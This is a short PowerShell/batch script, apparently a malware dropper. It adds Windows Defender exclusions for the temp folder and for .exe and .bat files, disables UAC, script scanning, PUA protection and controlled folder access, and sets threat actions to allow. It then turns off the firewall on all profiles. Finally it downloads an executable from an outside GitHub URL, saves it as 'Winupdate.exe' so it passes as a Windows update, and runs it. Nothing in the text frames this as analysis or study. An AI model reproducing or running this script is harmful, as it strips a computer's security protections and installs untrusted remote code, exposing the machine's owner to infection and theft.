cd (gi $env:temp).fullname
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %temp%
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension .exe
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension .bat
 New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -EnableControlledFolderAccess Disabled
 powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -PUAProtection disable
 powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
 powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableScriptScanning $true
 powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -HighThreatDefaultAction 6 -Force
 powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -ModerateThreatDefaultAction 6
 powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -LowThreatDefaultAction 6
 powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -SevereThreatDefaultAction 6
 netsh advfirewall set allprofiles state off
 Import-Module BitsTransfer
cd (gi $env:temp).fullname
 start-bitstransfer  https://github.com/thymeman/clius/raw/main/Client-blient.exe  .\Winupdate.exe 
timeout 3 
start Winupdate.exe